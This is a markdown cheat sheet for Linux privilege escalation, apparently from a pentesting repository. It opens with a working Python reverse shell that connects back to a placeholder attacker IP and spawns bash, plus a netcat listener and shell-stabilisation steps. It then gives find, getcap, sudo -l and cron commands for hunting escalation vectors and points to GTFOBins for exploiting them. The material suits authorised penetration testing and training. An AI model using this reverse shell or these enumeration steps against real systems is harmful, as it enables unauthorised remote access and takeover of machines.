# BASIC PRIVILEGE ESCALATION ENUMERATION
This document contains a list of useful commands for privilege escalation in Unix-like operating systems. These commands can help identify potential vectors for escalating privileges on a system. Most of them should be exploitable with the help of [GTFOBins](https://gtfobins.github.io/).

## Python Reverse Shell & Netcat Listener
It connects a compromised machine to an attacker's IP for remote command execution, while a Netcat listener waits on a specified port to receive incoming connections from such reverse shells.
#### Python TTY Reverse Shell
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.x.y",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'
```
#### Netcat listener
```
nc -nvlp 4444
```

## Upgrading to a TTY Shell
A TTY (teletypewriter) shell is a command-line interface that allows users to interact with the operating system through a terminal, enabling input and output of text commands and responses in a real-time, interactive session. It simulates the behavior of traditional teletypes, providing a way to execute commands and scripts in a Unix-like environment. There are a total 3 steps to spawning a successful TTY Shell:
- STEP-1: Run `python3 -c 'import pty;pty.spawn("/bin/bash")'` to spawn a better-featured pretty looking bash shell. But we still won’t be able to use tab autocomplete or the arrow keys.
- STEP-2: Run `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp` to set or modify the value of the PATH environment variable in a Unix-like OS such as Linux or macOS.
- STEP-3: Run the command: `export TERM=xterm-256color` to access term commands such as `clear`.
- STEP-4: Background the Session using the SHORTCUT: `CTRL + Z`.
- STEP-5: Run the command: `stty raw -echo; fg; reset` to turn off the terminal echo (giving us access to tab autocompletes, the arrow keys, and Ctrl + C to kill processes).
- STEP-6: (Optional) Run the command" `stty columns 200 rows 200` to Set the terminal size to 200*200 for better readability.

## Table of Contents
- [Finding SUID Files](#finding-suid-files)
- [Finding SGID Files](#finding-sgid-files)
- [Finding Capabilities of Files](#finding-capabilities-of-files)
- [Checking Sudo Permissions](#checking-sudo-permissions)
- [Finding Writable Files and Directories](#finding-writable-files-and-directories)
- [Finding Executables in PATH](#finding-executables-in-path)
- [Listing Scheduled Cron Jobs](#listing-scheduled-cron-jobs)
- [Checking User and Group Information](#checking-user-and-group-information)

### Finding SUID Files
- Finding the files with SUID (Set User ID) execution permissions of the file Owner which could be used to escalate privileges.
```
find / -perm -4000 -type f 2>/dev/null
```

### Finding SGID Files
- Finding the files with SGID (Set Group ID) execution permissions of the file Owner's group which could be used to escalate privileges.
```
find / -perm -2000 -type f 2>/dev/null
```

### Finding Capabilities of Files
- Recursively listing the capabilities of all files on the root file system, suppressing error messages.
```
getcap -r / 2>/dev/null
```

### Checking Sudo Permissions
- Finding out what SUDO privileges the current has (If any):
```
sudo -l
```

### Finding Writable Files and Directories
- Identifying files and directories writable by the user can help in various privilege escalation scenarios.

Writable Files
```
find / -writable -type f 2>/dev/null
```
Writable Directories
```
find / -writable -type d 2>/dev/null
```

### Finding Executables in PATH
- Finding executables in the PATH environment variable can help identify potentially exploitable scripts or binaries.
```
echo $PATH | tr ':' '\n' | xargs -I {} find {} -type f -executable 2>/dev/null
```

### Listing Scheduled Cron Jobs
- Viewing cron jobs can reveal scheduled tasks that may be leveraged for privilege escalation.
```
cat /etc/crontab && ls /etc/cron.* && crontab -l && ls /var/spool/cron/crontabs
```

### Checking User and Host Information
- Checking user and group details can provide insight into potential privilege escalation opportunities.
```
whoami && id && hostname
```

Feel free to modify or expand upon this template based on your needs. If you have any specific commands or sections you’d like to add, let me know!
